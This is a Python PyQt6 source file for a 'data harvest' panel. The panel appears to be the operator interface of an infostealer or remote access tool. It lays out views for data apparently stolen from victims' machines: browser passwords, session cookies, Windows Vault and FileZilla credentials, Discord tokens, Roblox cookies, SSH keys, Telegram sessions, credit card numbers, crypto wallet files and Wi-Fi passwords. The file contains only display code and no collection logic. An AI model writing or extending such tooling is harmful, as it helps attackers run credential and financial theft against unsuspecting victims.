# ui/data_harvest_pane.py (Full Code, Real-Time Update Logic)
from PyQt6.QtWidgets import (QWidget, QHBoxLayout, QListWidget, QStackedWidget, 
                             QVBoxLayout, QTableWidget, QTextEdit, 
                             QHeaderView, QTableWidgetItem, QAbstractItemView, QSizePolicy)
from PyQt6.QtCore import Qt

class DataHarvestPane(QWidget):
    def __init__(self):
        super().__init__()
        
        main_layout = QHBoxLayout(self)
        
        self.category_list = QListWidget()
        self.category_list.setFixedWidth(240)
        self.category_list.setSizePolicy(QSizePolicy.Policy.Fixed, QSizePolicy.Policy.Expanding)
        
        self.categories = [
            "OS Version & Build", "System Architecture", "Hostname", "Users (and current)", "System Uptime",
            "Hardware Info (CPU, GPU, RAM, Disks)", "Antivirus & Firewall Products", "Installed Applications",
            "Running Processes", "Environment Variables", "MAC Address", "IP Addresses (IPv4, IPv6, Public, Private)",
            "Wi-Fi Passwords", "Active Network Connections", "ARP Table (Local Network Devices)", "DNS Cache",
            "Browser Passwords", "Session Cookies", "Windows Vault Credentials", "Application Credentials (e.g., FileZilla)",
            "Discord Tokens", "Roblox Cookies", "SSH Keys", "Telegram Session Files", "Credit Card Data",
            "Cryptocurrency Wallet Files", "Browser Autofill", "Browser History", "Clipboard Contents"
        ]
        self.category_list.addItems(self.categories)
        main_layout.addWidget(self.category_list)
        
        self.content_stack = QStackedWidget()
        main_layout.addWidget(self.content_stack, 1)
        
        # --- Create a view for every category ---
        self.views = {
            "os_info": self._create_text_view(),
            "hardware_info": self._create_text_view(),
            "security_products": self._create_text_view(),
            "installed_apps": self._create_text_view(is_mono=True),
            "running_processes": self._create_text_view(is_mono=True),
            "env_variables": self._create_text_view(is_mono=True),
            "network_info": self._create_text_view(),
            "wifi_passwords": self._create_table(["SSID", "Password"]),
            "active_connections": self._create_text_view(is_mono=True),
            "arp_table": self._create_text_view(is_mono=True),
            "dns_cache": self._create_text_view(is_mono=True),
            "browser_passwords": self._create_table(["URL", "Username", "Password"]),
            "session_cookies": self._create_table(["Host", "Name", "Expires (UTC)", "Value"]),
            "windows_vault": self._create_table(["Resource", "Username", "Password"]),
            "filezilla": self._create_table(["Host", "Port", "Username", "Password"]),
            "discord_tokens": self._create_text_view(is_mono=True),
            "roblox_cookies": self._create_text_view(is_mono=True),
            "ssh_keys": self._create_text_view(is_mono=True),
            "telegram": self._create_text_view(),
            "credit_cards": self._create_table(["Name on Card", "Expires (MM/YY)", "Card Number"]),
            "crypto_wallets": self._create_text_view(is_mono=True),
            "browser_autofill": self._create_table(["Field Name", "Value"]),
            "browser_history": self._create_table(["URL", "Title", "Visit Count", "Last Visit (UTC)"]),
            "clipboard": self._create_text_view(is_mono=True),
        }

        # Map command names to views
        self.view_map = {
            "os_info": self.views["os_info"], "hardware_info": self.views["hardware_info"], "security_products": self.views["security_products"],
            "installed_apps": self.views["installed_apps"], "running_processes": self.views["running_processes"], "env_variables": self.views["env_variables"],
            "network_info": self.views["network_info"], "wifi_passwords": self.views["wifi_passwords"], "active_connections": self.views["active_connections"],
            "arp_table": self.views["arp_table"], "dns_cache": self.views["dns_cache"], "browser_passwords": self.views["browser_passwords"],
            "session_cookies": self.views["session_cookies"], "windows_vault": self.views["windows_vault"], "filezilla": self.views["filezilla"],
            "discord_tokens": self.views["discord_tokens"], "roblox_cookies": self.views["roblox_cookies"], "ssh_keys": self.views["ssh_keys"],
            "telegram": self.views["telegram"], "credit_cards": self.views["credit_cards"], "crypto_wallets": self.views["crypto_wallets"],
            "browser_autofill": self.views["browser_autofill"], "browser_history": self.views["browser_history"], "clipboard": self.views["clipboard"]
        }
        
        # Create a flat list of widgets in the correct order for the QStackedWidget and category list
        self.ordered_widgets = [
            self.views["os_info"], self.views["os_info"], self.views["os_info"], self.views["os_info"], self.views["os_info"], # OS Info fields
            self.views["hardware_info"], self.views["security_products"], self.views["installed_apps"], self.views["running_processes"],
            self.views["env_variables"], self.views["network_info"], self.views["network_info"], self.views["wifi_passwords"],
            self.views["active_connections"], self.views["arp_table"], self.views["dns_cache"], self.views["browser_passwords"],
            self.views["session_cookies"], self.views["windows_vault"], self.views["filezilla"], self.views["discord_tokens"],
            self.views["roblox_cookies"], self.views["ssh_keys"], self.views["telegram"], self.views["credit_cards"],
            self.views["crypto_wallets"], self.views["browser_autofill"], self.views["browser_history"], self.views["clipboard"]
        ]

        for widget in self.ordered_widgets:
            if self.content_stack.indexOf(widget) == -1:
                self.content_stack.addWidget(widget)

        self.category_list.currentItemChanged.connect(lambda current: self.content_stack.setCurrentWidget(self.ordered_widgets[self.category_list.row(current)]) if current else None)
        self.category_list.setCurrentRow(0)

    def _create_text_view(self, is_mono=False):
        text_edit = QTextEdit(); text_edit.setReadOnly(True)
        if is_mono: text_edit.setFontFamily("Consolas")
        return text_edit

    def _create_table(self, headers):
        table = QTableWidget(); table.setColumnCount(len(headers)); table.setHorizontalHeaderLabels(headers)
        table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.ResizeToContents); table.horizontalHeader().setStretchLastSection(True)
        table.setEditTriggers(QAbstractItemView.EditTrigger.NoEditTriggers); table.setSelectionBehavior(QAbstractItemView.SelectionBehavior.SelectRows)
        table.verticalHeader().setVisible(False); table.setSortingEnabled(True)
        return table

    def clear_all_views(self):
        for view in self.views.values():
            if isinstance(view, QTextEdit): view.clear()
            elif isinstance(view, QTableWidget): view.setRowCount(0)

    def update_view(self, command_name, data):
        view = self.view_map.get(command_name)
        if not view: return

        if isinstance(view, QTextEdit):
            self._populate_text_view(view, data, command_name)
        elif isinstance(view, QTableWidget):
            self._populate_table(view, data)

    def _populate_text_view(self, view, data, command_name):
        if not data: view.setText("No data found."); return
        
        # Specific handling for combined views like os_info and network_info
        if command_name in ["os_info", "hardware_info", "security_products", "network_info"]:
            current_html = view.toHtml()
            # A simple way to avoid re-adding the same title
            if not current_html:
                 current_html = f"<h3>{command_name.replace('_', ' ').title()}</h3>"

            html_to_add = ""
            if isinstance(data, dict):
                for key, value in data.items():
                    key_formatted = key.replace("_", " ").title()
                    value_formatted = f"<pre>{str(value)}</pre>" if isinstance(value, str) and '\n' in value else str(value)
                    html_to_add += f"<p><b>{key_formatted}:</b> {value_formatted}</p>"
            else:
                 html_to_add += f"<p>{str(data)}</p>"
            view.setHtml(current_html + html_to_add)
        elif isinstance(data, list):
             view.setText("\n".join(data))
        else:
            view.setText(str(data))

    def _populate_table(self, table, data_list):
        if not isinstance(data_list, list) or not data_list: table.setRowCount(0); return
        
        # Append rows instead of replacing them
        start_row = table.rowCount()
        table.setRowCount(start_row + len(data_list))
        for row_idx, row_data in enumerate(data_list):
            if isinstance(row_data, list):
                 for col_idx, cell_data in enumerate(row_data):
                     table.setItem(start_row + row_idx, col_idx, QTableWidgetItem(str(cell_data)))
        table.resizeColumnsToContents()